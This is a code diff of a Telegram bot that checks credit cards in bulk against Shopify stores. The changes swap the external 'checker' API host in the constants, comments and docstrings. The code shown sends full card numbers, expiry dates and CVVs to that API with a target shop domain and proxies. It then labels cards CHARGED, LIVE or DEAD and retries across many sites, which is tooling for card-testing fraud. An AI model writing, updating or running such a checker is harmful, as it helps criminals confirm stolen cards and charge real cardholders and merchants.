@@ -2,7 +2,7 @@
 sh.py  v28  —  /sh single-card + /msh mass Shopify checker
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Framework : python-telegram-bot v21
-API       : https://shopifyy.up.railway.app/shopii
+API       : https://laxu-production.up.railway.app/shopii
             GET ?cc=NUM|MM|YY|CVV&site=DOMAIN&proxy=http://ip:port
             site  = plain domain, NO https:// prefix
             proxy = http://ip:port  (WITH http:// prefix)
@@ -88,7 +88,7 @@ from config import (
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CONSTANTS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-API_URL       = "https://shopifyy.up.railway.app/shopii"
+API_URL       = "https://laxu-production.up.railway.app/shopii"
 BOT_CHANNEL   = CHANNEL_LINK
 DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'
 
@@ -106,7 +106,7 @@ MY_CHANNEL_LINK     = CHANNEL_LINK                                 # main channe
 SH_COOLDOWN    = 25
 
 # ── Speed / concurrency settings ───────────────────────────────────────────
-# shopifyy.up.railway.app is a shared Railway app — it can't handle hundreds of
+# laxu-production.up.railway.app is a shared Railway app — it can't handle hundreds of
 # simultaneous connections.  Too many concurrent calls → 502/503 errors →
 # real bank responses (PCI_ERROR, GENERIC_ERROR, etc.) never arrive →
 # cards falsely marked DEAD.
@@ -337,7 +337,7 @@ def _is_success_response(resp: str) -> bool:
 
 def classify_response(resp: str) -> str:
     """
-    Classify a response string from shopifyy.up.railway.app.
+    Classify a response string from laxu-production.up.railway.app.
     Returns one of: CHARGED | TDS | LIVE | DEAD | RETRY | ERROR
 
       CHARGED / TDS / LIVE / DEAD  →  final verdict, stop checking this card
@@ -760,7 +760,7 @@ def extract_cards(text: str) -> list:
 def _parse_response_field(data: dict) -> str:
     """Extract the human-readable response string from the API JSON.
 
-    shopifyy.up.railway.app returns:
+    laxu-production.up.railway.app returns:
       {"Status": true/false, "Response": "ORDER_PAID"|"CARD_DECLINED"|...,
        "Gateway": "shopify_payments", "Price": "0.98", "Currency": "USD", ...}
 
@@ -814,9 +814,9 @@ def _normalise_gateway(raw: str) -> str:
 
 async def _call_api(card: str, site: str, proxy: Optional[str],
                     timeout: float = SITE_TIMEOUT) -> tuple:
-    """Call the shopifyy.up.railway.app checker API.
+    """Call the laxu-production.up.railway.app checker API.
 
-    Endpoint : https://shopifyy.up.railway.app/shopii
+    Endpoint : https://laxu-production.up.railway.app/shopii
     Method   : GET
     Params   :
         cc    = CARDNUM|MM|YY|CVV   (pipe-separated, all in one param)
@@ -839,7 +839,7 @@ async def _call_api(card: str, site: str, proxy: Optional[str],
         502/503 responses — hiding real bank results (PCI_ERROR, etc.).
     """
     site_clean = _strip_scheme(site)      # drop any https:// prefix
-    # New API (shopifyy.up.railway.app) loads proxies from px.txt server-side
+    # New API (laxu-production.up.railway.app) loads proxies from px.txt server-side
     # automatically — no &proxy= param needed or accepted.
     url = f"{API_URL}?cc={card}&site={site_clean}"
 
@@ -1016,7 +1016,7 @@ async def _check_card_with_retry(
                     continue
 
                 # HTTP-level error from the API server itself (not the Shopify site).
-                # 502/503/504 mean the gate API (shopifyy.up.railway.app) is down —
+                # 502/503/504 mean the gate API (laxu-production.up.railway.app) is down —
                 # retrying with a different Shopify site won't help.
                 if http_st and http_st not in (200,):
                     local_dead.add(site)
